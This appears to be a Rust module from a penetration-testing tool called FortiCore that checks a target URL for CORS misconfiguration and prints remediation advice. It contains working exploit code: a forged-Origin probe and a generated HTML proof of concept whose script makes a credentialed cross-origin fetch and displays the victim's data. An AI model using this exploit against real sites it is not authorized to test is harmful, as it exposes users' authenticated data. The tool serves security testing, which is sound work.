use crate::utils::{error::FortiCoreResult, FortiCoreError};
use colored::*;
use reqwest::{
    header::{HeaderMap, HeaderValue, USER_AGENT},
    Client,
};
use serde_json::json;
use url::Url;

pub async fn exploit(target: &str, safe_mode: bool, verbose: bool) -> FortiCoreResult<()> {
    println!(
        "{}",
        "Starting CORS Misconfiguration exploitation module...".bright_yellow()
    );

    if !safe_mode {
        println!(
            "{}",
            "Warning: Safe mode is disabled. Running full CORS exploits.".bright_red()
        );
    }

    // Normalize URL
    let target_url = normalize_url(target);
    let parsed_url = Url::parse(&target_url)
        .map_err(|e| FortiCoreError::InputError(format!("Invalid URL format: {}", e)))?;

    if verbose {
        println!("Targeting URL: {}", target_url);
    }

    // Create HTTP client with appropriate headers
    let client = create_client()?;

    println!(
        "{}",
        "Phase 1: Verifying CORS vulnerability...".bright_blue()
    );
    let (is_vulnerable, acao_value) = verify_cors_vulnerability(&client, &target_url).await?;

    if !is_vulnerable {
        println!("{}", "No CORS misconfiguration detected.".bright_yellow());
        return Ok(());
    }

    println!("{}", "Phase 2: Testing CORS exploitation...".bright_blue());
    println!(
        "Found vulnerable CORS configuration: Access-Control-Allow-Origin: {}",
        acao_value
    );

    if acao_value == "*" {
        println!(
            "{}",
            "The server allows cross-origin requests from ANY domain!".bright_red()
        );
    } else {
        println!("{}", "The server reflects arbitrary origins!".bright_red());
    }

    // Demonstrate the vulnerability with a PoC
    println!(
        "\n{}",
        "Phase 3: CORS Exploitation Proof of Concept".bright_blue()
    );

    // Create a PoC for the vulnerability
    let poc_html = create_cors_poc(&target_url, &acao_value);

    println!("Proof of Concept HTML (save to a file and open in a browser):");
    println!("{}", poc_html.bright_green());

    // In non-safe mode, we would do more advanced exploitation
    if !safe_mode {
        println!(
            "\n{}",
            "Advanced exploitation (non-safe mode):".bright_red()
        );
        println!("- Constructing a webpage that can perform authenticated requests to the target");
        println!("- Extracting sensitive data from vulnerable API endpoints");
        println!(
            "- Session hijacking by stealing cookies/tokens if credentials are included in CORS"
        );
    }

    // Provide remediation guidance
    println!("\n{}", "Remediation recommendations:".bright_yellow());
    println!("1. Implement proper CORS policy with specific trusted origins only");
    println!("2. Avoid using wildcards (*) in production environments");
    println!("3. For APIs, restrict the Access-Control-Allow-Origin header to trusted domains");
    println!("4. If dynamic origins are needed, validate them against a whitelist");
    println!("5. Consider using the Vary: Origin header when varying responses");
    println!("6. Set appropriate Access-Control-Allow-Credentials, Access-Control-Allow-Methods, and Access-Control-Allow-Headers");

    Ok(())
}

async fn verify_cors_vulnerability(client: &Client, url: &str) -> FortiCoreResult<(bool, String)> {
    // Try with a test origin to see if it's reflected or if wildcard is used
    let resp = client
        .get(url)
        .header("Origin", "https://malicious-site.example.com")
        .send()
        .await
        .map_err(|e| {
            FortiCoreError::NetworkError(format!("Failed to connect to {}: {}", url, e))
        })?;

    let headers = resp.headers();

    if let Some(acao) = headers.get("Access-Control-Allow-Origin") {
        let value = acao.to_str().unwrap_or("");

        if value == "*" || value == "https://malicious-site.example.com" {
            return Ok((true, value.to_string()));
        }
    }

    // Not vulnerable
    Ok((false, String::new()))
}

fn create_cors_poc(target_url: &str, acao_value: &str) -> String {
    let mut poc = String::new();

    poc.push_str("<!DOCTYPE html>\n");
    poc.push_str("<html>\n<head>\n");
    poc.push_str("    <title>CORS Vulnerability PoC</title>\n");
    poc.push_str("</head>\n<body>\n");
    poc.push_str("    <h1>CORS Vulnerability Proof of Concept</h1>\n");
    poc.push_str("    <p>Target URL: ");
    poc.push_str(target_url);
    poc.push_str("</p>\n");
    poc.push_str("    <p>ACAO Value: ");
    poc.push_str(acao_value);
    poc.push_str("</p>\n");
    poc.push_str("    <button onclick=\"exploitCORS()\">Exploit CORS Vulnerability</button>\n");
    poc.push_str("    <div id=\"result\" style=\"margin-top: 20px; border: 1px solid #ccc; padding: 10px;\"></div>\n\n");

    poc.push_str("    <script>\n");
    poc.push_str("        function exploitCORS() {\n");
    poc.push_str("            document.getElementById('result').innerHTML = 'Attempting to exploit CORS...';\n");
    poc.push_str("            fetch('");
    poc.push_str(target_url);
    poc.push_str("', {\n");
    poc.push_str("                method: 'GET',\n");
    poc.push_str("                credentials: 'include',\n");
    poc.push_str("                headers: {\n");
    poc.push_str("                    'Accept': '*/*'\n");
    poc.push_str("                }\n");
    poc.push_str("            })\n");
    poc.push_str("            .then(response => response.text())\n");
    poc.push_str("            .then(data => {\n");
    poc.push_str("                document.getElementById('result').innerHTML = '<p>Successful CORS Exploit!</p>';\n");
    poc.push_str("                document.getElementById('result').innerHTML += '<p>Data retrieved from target site:</p>';\n");
    poc.push_str("                document.getElementById('result').innerHTML += '<pre>' + data.substring(0, 1000) + '...</pre>';\n");
    poc.push_str("            })\n");
    poc.push_str("            .catch(error => {\n");
    poc.push_str(
        "                document.getElementById('result').innerHTML = 'Error: ' + error;\n",
    );
    poc.push_str("            });\n");
    poc.push_str("        }\n");
    poc.push_str("    </script>\n");
    poc.push_str("</body>\n</html>");

    poc
}

fn normalize_url(url: &str) -> String {
    if !url.starts_with("http://") && !url.starts_with("https://") {
        format!("http://{}", url)
    } else {
        url.to_string()
    }
}

fn create_client() -> FortiCoreResult<Client> {
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) FortiCore/0.1.0"),
    );

    let client = Client::builder()
        .default_headers(headers)
        .timeout(std::time::Duration::from_secs(15))
        .build()
        .map_err(|e| {
            FortiCoreError::NetworkError(format!("Failed to create HTTP client: {}", e))
        })?;

    Ok(client)
}
